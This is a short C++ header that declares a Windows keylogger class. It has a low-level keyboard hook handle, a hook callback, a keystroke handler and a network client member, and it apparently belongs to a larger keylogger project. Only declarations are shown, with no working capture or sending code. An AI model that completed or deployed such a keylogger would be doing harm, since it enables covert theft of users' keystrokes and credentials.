#pragma once

#ifdef _WIN32
#define _WIN32_WINNT 0x0A00
#endif

#include "WinSock2.h"
#include <iostream>
#include <Windows.h>
#include <fstream>
#include "client_keylogger.h"
#include "kqnet.h"
#include "common.h"

class keylogger
{
public:
    keylogger();
    ~keylogger();
    void handleKeyStroke(DWORD virtualKeyCode, keyStatus status);


public:
    HHOOK hook;
    client_keylogger client;

private:
    static LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
};

extern keylogger transKeys;